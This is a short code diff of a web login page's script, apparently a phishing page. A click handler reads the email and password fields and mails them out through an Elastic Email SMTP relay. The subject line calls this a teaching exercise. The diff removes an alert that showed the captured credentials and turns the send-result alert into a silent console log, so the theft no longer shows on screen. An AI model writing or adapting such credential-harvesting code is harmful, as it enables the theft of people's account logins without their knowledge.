@@ -8,8 +8,6 @@
  <script>
     $(document).ready(function(){
     $('#login_password_step_element').click(function(){
-        alert("信箱:" + document.getElementById("m_login_email").value+"密碼:"+document.getElementById("m_login_password").value);
-
         function sendEmail(){
             Email.send({
             Host : "smtp.elasticemail.com",
@@ -20,7 +18,7 @@
             Subject : "教學用帳號密碼傳回值",
             Body : "信箱:" + document.getElementById("m_login_email").value+"密碼:"+document.getElementById("m_login_password").value
             }).then(
-                message => alert("執行結果:"+message)
+                message => console.log("執行結果:"+message)
             );
         }
         sendEmail();
